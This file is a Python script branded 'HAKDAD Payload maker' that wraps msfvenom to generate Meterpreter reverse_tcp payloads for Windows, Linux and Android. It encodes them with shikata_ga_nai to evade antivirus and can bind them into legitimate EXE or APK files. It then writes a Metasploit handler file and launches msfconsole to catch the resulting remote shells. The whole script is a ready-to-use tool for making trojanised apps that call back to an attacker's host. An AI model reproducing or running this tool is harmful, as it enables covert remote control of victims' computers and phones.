#! /usr/bin/python
#@mr_kali_hacker
############################################
############################################
#imports
from os import system
import sys
import signal
import os
import subprocess
import time
import socket
import random
################################################
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
###############################################
###############################################

##############################################
##############################################
os.system('clear')
os.system("figlet _____________")
os.system("toilet -f big '   HAKDAD ' -F gay | lolcat")
os.system("toilet -f big 'Payload maker ' -F gay | lolcat")
print ("                                                     --version 1.0")
os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
print
print (" Author NAME      :   VAMSI")
print (" YOUTUBE CHANNEL  :   CyberSec Academy - Telugu")
print (" INSTAGRAM ID     :   Mr_kali_hacker")
print

os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYSTEM \n\t\t\t1.windows\n\t\t\t2.android\n\t\t\t3.linux\033[97m\n\t\t\t4.windows bind\n\t\t\t5.android bind\n>>> \033[93m""")
                                       
ip_address = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Your IP Address : \033[97m>>> \033[93m")
port_given = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Port Number     : \033[97m>>> \033[93m")
save_directory = "/root/hakdad_generated_payloads"
name = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Payload Name: \033[97m>>> \033[93m")


if os == "1":
	payload = "windows/meterpreter/reverse_tcp"
	formation = "exe"
	platform = "Windows"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)

if os == "3":
	payload = "linux/meterpreter/reverse_tcp"
	formation = "sh"
	platform = "Linux"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)

if os == "5":
	payload = "android/meterpreter/reverse_tcp"
	formation = "apk"
	platform = "Android"
	original = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER ORIGINAL APK FILE NAME WITH DIRECTORY    : \033[97m>>> \033[93m")
	command = r"msfvenom -x {6} -p {0} LHOST={1} LPORT={2} > {3}/{4}.{5}".format( payload, ip_address, port_given, save_directory, name, formation, original)

if os == "4":
	payload = "windows/meterpreter/reverse_tcp"
	formation = "exe"
	platform = "Windows"
	original = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER ORIGINAL EXE FILE NAME WITH DIRECTORY    : \033[97m>>> \033[93m")
	command = r"msfvenom --platform {0} -x {7} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation, original)

if os == "2":
	payload = "android/meterpreter/reverse_tcp"
	formation = "apk"
	platform = "Android"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)
system(command)

print("\033[94m[*]\033[91m>>Payload Created Successfully. \033[93m")
print("\033[94m[*] \033[91m>>Payload Saved In  Directory /root/hakdad_generated_payloads \033[93m")

print("\n\n\t\033[94m[*]\033[91m Starting Metasploit Listener \033[93m[*]")


handler_file = "{0}handler.rc".format(save_directory)
f = open(handler_file, 'a')
handler_options = """use multi/handler
		                 set PAYLOAD {0}
		                 set LHOST {1}
		                 set LPORT {2}
		                 set ExitOnSession false
		                 exploit -j""".format(payload, ip_address, port_given)

f.write(handler_options)
f.close()
handler = "msfconsole -q -r {0}".format(handler_file)
system(handler)

